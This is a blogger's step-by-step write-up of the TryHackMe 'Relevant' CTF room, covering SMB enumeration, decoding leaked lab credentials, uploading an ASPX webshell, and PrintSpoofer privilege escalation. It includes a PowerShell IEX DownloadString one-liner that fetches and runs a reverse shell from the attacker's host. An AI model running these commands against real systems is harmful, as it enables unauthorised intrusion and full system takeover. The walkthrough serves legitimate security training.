[<- home](/)

# Relevant [TryHackMe]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.121.25
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -A -Pn $targ3t -oN nmap.scan
```

Some ports came up, one of which is `80`. Until this scan ends, let's browse the website:

```
firefox $targ3t
```

There's a windows server welcome screen. Let's run it through `feroxbuster`:

```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

The `nmap` scan has ended while we were at it. The ports discovered are: 

```
80/tcp      http
135/tcp     msrpc
139/tcp     netbios-ssn
445/tcp     microsoft-ds
3389/tcp    ssl/ms-webt-server?
```

These ports don't seem to have valid ways in, any exploits associated with them or anything. Before I dive deeper, I'll run a full nmap scan for all ports, just in case.

```
nmap -p- $targ3t -oN nmap.full.scan -vv
```

New ports:

```
49663/tcp   unknown
49667/tcp   unknown
49669/tcp   unknown
```

Let's see what theese ports are:

```
nmap -sV -p 49663,49667,49669 $targ3t -oN nmap.service.scan -vv
```

We did find out somet things:

```
49663/tcp   http
49667/tcp   msrpc
49669/tcp   msrpc
```

Let's visit the `http` one:

```
firefox $targ3t:49663
```

This endpoint seems to be identical to the `80/tcp` port. 

<sup>_Assisted by a [write-up](https://madushan-perera.medium.com/tryhackme-relevant-walkthrough-6e7c83def069):_</sup> I didn't know of this flag `smbclient` had, but apparently we can check for shares on an SMB port:

```
smbclient -L $targ3t
```

One of the shares returned has Sharename `nt4wrksv`, so we're going to try to connect to it:

```
smbclient \\\\$targ3t\nt4wrksv
```

And it works, we got an anonymous login prompt.

```
ls
```

Shows there's a `password.txt` on here:

```
get passwords.txt
```

Let's quit the `smbclient` and see what's inside this file:

```
cat apsswords.txt
```

This looks like `base64` encoded strings:

```
sed -n 2p passwords.txt | base64 -d
```

The returned string is `Bob - !P@$$W0rD!123`. Let's check the next one:

```
sed -n 3p passwords.txt | base64 -d
```

The returned string: `Bill - Juw4nnaM4n420696969!$$$`. I don't remember any login interfaces, I wonder if these passwords are going to work on RDP:

```
xfreerdp /u:RELEVANT\Bob /p:'!P@$$W0rD!123' /v:$targ3t:3389 /cert:ignore
```

This command and many other variations (without Domain, without `/cert`) failed for different reasons, it gives a different error each time. Before trying something else, I'll enumerate SMB once again with `nmap`:

```
nmap --script vuln -p 445 $targ3t -oN nmap.vuln.scan
```

Two vulnerabilities were found: `CVE-2011-1002` which is a DoS and `CVE-2017-0143` which is a highly familiar ms17-010, a.k.a `eternal_blue`. 

```
searchsploit --cve 2017-0143
```

There is a python exploit for remote code execution:

```
searchsploit -m windows_x86-64/remote/41987.py
```

Tried running this script a number of times with different changes and fixes, even saw github repo it referenced but nothing worked. But I understand that the whole point of this is that I'm allowed to upload a file to the share and reference it in the browser. I'll try to upload a shell now:

I looked for an `aspx` shell and I found this [neat little thing](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) on GitHub.

```
smbclient \\\\$targ3t\\nt4wrksv
put shell.aspx
quit
curl http://$targ3t:49663/nt4wrksv/shell.aspx
```

And you get a webshell interface. On the right you can simply navigate to `C:\Users\Bob\Desktop\user.txt` and that's the first flag. `C:\Users\Administrator` is off limits, so we can try to see what privileges are exploitable. On the left type in the shell:

```
whoami \priv
```

This is what's returned:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
w 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I have escalated privileges on Windows through SeImpersonatePrivilege before and after a quick google search found several GitHub repositories that allow a file to be uploaded to the remote machine and exploit this Privilege. Only one had `.exe` executable released so I used that one:

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
smbclient \\\\$targ3t\\nt4wrksv
put PrintSpoofer64.exe
quit
```

Now all we need to do is, serve a PowerShell reverse shell from a local python server and start a netcat listener alongside it:

```
python -m http.server 8080
nc -lvnp 9876
```

Download the following `ps1` reverse shell:

```
wget https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1
```

Make changes to this file, add your local IP address and Port instead of the ones in use. And now in our `aspx` web shell, let's execute the following command: 

```
PrintSpoofer64.exe -i -c "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.11.100.243:8080/powershell-reverse-shell.ps1')"
```

And in our netcat listener we get the root shell:

```
SHELL>
```

Let's find out who we are:

```
SHELL> whoami
nt authority\system
```

Which means we can navigate to the root flag:

```
Set-Location C:\Users\Administrator\Desktop
Get-ChildItem
```

There is a `root.txt` here:

```
Get-Content root.txt
```

That's our root flag!

<sub>_I avoided using `metasploit` on this machine and even though I had help from a write-up, I still fared pretty well, imho. I initially wanted to go full reverse shell mode and use WinPeas but thank god for PrintSpoofer._</sub>
